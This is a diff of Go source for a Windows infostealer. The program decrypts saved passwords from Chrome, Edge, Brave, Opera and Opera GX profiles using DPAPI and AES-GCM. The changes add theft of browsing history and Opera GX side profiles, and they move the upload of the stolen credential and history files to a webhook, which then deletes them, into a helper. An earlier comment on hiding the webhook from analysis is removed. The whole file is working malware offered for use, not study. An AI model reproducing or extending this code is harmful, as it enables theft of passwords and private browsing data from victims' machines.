@@ -5,11 +5,11 @@ import (
 	"io"
 	"bytes"
 	"regexp"
+	"strconv"
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
 	"encoding/json"
-	"encoding/hex"
 	"database/sql"
 	"net/http"
 	"io/ioutil"
@@ -22,7 +22,8 @@ import (
 var (
 	BroswPath=os.Getenv("USERPROFILE")+"\\AppData\\Local"
 	Tmpfile=os.Getenv("APPDATA")+"\\tmp.dat"
-	Outfile=os.Getenv("APPDATA")+"\\lebron_out.txt"
+	Credfile=os.Getenv("APPDATA")+"\\creds.txt"
+	Histfile=os.Getenv("APPDATA")+"\\history.txt"
 	Chrome="\\Google\\Chrome\\User Data"
 	Edge="\\Microsoft\\Edge\\User Data"
 	Brave="\\BraveSoftware\\Brave-Browser\\User Data"
@@ -30,49 +31,46 @@ var (
 	OperaGX="\\Opera Software\\Opera GX Stable"
 )
 
-/*	Your webhook must be hex encoded (without 0x).
-	This is just a easy information hiding step to not let someone find your webhook analyzing the string in the executable at first.
-*/
-const webhook = ""
+var WEBHOOK = ""
 
 func secret_key(lspath string)([]byte, error){
 	var key []byte
 	jason, err := os.Open(lspath)
 	if err != nil {
-		return key,err
+		return key, err
 	}
 	defer jason.Close()
 	byteval, err := ioutil.ReadAll(jason)
 	if err != nil {
-		return key,err
+		return key, err
 	}
 	var result map[string]interface{}
 	json.Unmarshal([]byte(byteval),&result)
 	decodedkey, err := base64.StdEncoding.DecodeString(result["os_crypt"].(map[string]interface{})["encrypted_key"].(string))
 	key, err = dpapi.DecryptBytes(decodedkey[5:])		//the encrypted key starts with "DPAPI"
 	if err != nil{
-		return key,err
+		return key, err
 	}
-	return key,nil
+	return key, nil
 }
 
 func decrypt(password, key []byte)(string,error){
-	password=password[3:]							//every encrypted password starts with "v10"
+	password=password[3:]								//every encrypted password starts with "v10"
 	aesdc, _ := aes.NewCipher(key)
 	gcm, err := cipher.NewGCM(aesdc)
 	noncesize := gcm.NonceSize()
 	if len(password) < noncesize {
-		return "",err
+		return "", err
 	}
 	nonce, password := password[:noncesize], password[noncesize:]
 	result, err := gcm.Open(nil, nonce, password, nil)
 	if err != nil {
-		return "",err
+		return "", err
 	}
 	return string(result), nil
 }
 
-func create_db_connection(pathdb string)(*sql.DB, error) {
+func create_db_connection(pathdb string)(*sql.DB, error){
 	sourceFile, err := os.Open(pathdb)
 	if err != nil {
 		return nil, err
@@ -95,8 +93,10 @@ func create_db_connection(pathdb string)(*sql.DB, error) {
 }
 
 func let_him_cook(path string)(){
-	f, _ := os.OpenFile(Outfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	f, _ := os.OpenFile(Credfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	ff, _ := os.OpenFile(Histfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer f.Close()
+	defer ff.Close()
 	secret, err := secret_key(path+"\\Local State")
 	if err != nil {
 		return
@@ -108,13 +108,22 @@ func let_him_cook(path string)(){
 	var profiles []string
 	profiles=append(profiles, "")		//this is just for opera GX
 	for _, folder := range folders {
-		if match, _ := regexp.MatchString("^Profile*|^Default$",folder.Name());match{
+		if match, _ := regexp.MatchString("^Profile*|^Default$",folder.Name()); match{
 			profiles = append(profiles, folder.Name())
+		}
+	}
+	ihateoperagx, err := os.ReadDir(filepath.Join(path, "_side_profiles"))	//profiles for opera GX
+	if err == nil {
+		for _, folder := range ihateoperagx {
+			if folder.IsDir() {
+				profiles = append(profiles, filepath.Join("_side_profiles", folder.Name()))
+			}
 		}
 	}
 	for _, folder := range profiles {
 		ppath := filepath.Join(path,folder,"Login Data")
 		f.WriteString(ppath+"\n\n")
+		ff.WriteString(ppath+"\n\n")
 		var conn, err=create_db_connection(ppath)
 		if err != nil {
 			continue
@@ -125,16 +134,37 @@ func let_him_cook(path string)(){
 			var password []byte
 			cursor.Scan(&url, &username, &password)
 			if url != "" && username != "" && len(password) > 0 {
-				var pass,err = decrypt(password, secret)
+				var pass, err = decrypt(password, secret)
 				if err != nil {
 					continue
 				}
 				f.WriteString("URL: "+url+"\nUsername: "+username+"\nPassword: "+pass+"\n\n")
 			}
 		}
+		ppath = filepath.Join(path,folder,"History")
+		conn, err = create_db_connection(ppath)
+		cursor, err = conn.Query("SELECT url, visit_count FROM urls ORDER BY last_visit_time DESC")
+		for cursor.Next() {
+			var url string
+			var visit_count int
+			cursor.Scan(&url, &visit_count)
+			ff.WriteString("URL: "+url+"\nVisit count: "+strconv.Itoa(visit_count)+"\n\n")
+		}
 		conn.Close()
 		os.Remove(Tmpfile)
 	}
+}
+
+func upload_file(name string){
+	file, _ := os.Open(name)
+	defer os.Remove(name)
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, _ := writer.CreateFormFile("file", name)
+	io.Copy(part, file)
+	writer.Close()
+	file.Close()
+	http.Post(WEBHOOK, writer.FormDataContentType(), body)
 }
 
 func main(){
@@ -143,14 +173,6 @@ func main(){
 	let_him_cook(BroswPath+Brave)
 	let_him_cook(os.Getenv("APPDATA")+Opera)
 	let_him_cook(os.Getenv("APPDATA")+OperaGX)
-	file, _ := os.Open(Outfile)
-	defer os.Remove(Outfile)
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-	part, _ := writer.CreateFormFile("file", Outfile)
-	io.Copy(part, file)
-	writer.Close()
-	file.Close()
-	dhook,_:=hex.DecodeString(webhook)
-	http.Post(string(dhook), writer.FormDataContentType(),body)
+	upload_file(Credfile)
+	upload_file(Histfile)
 }
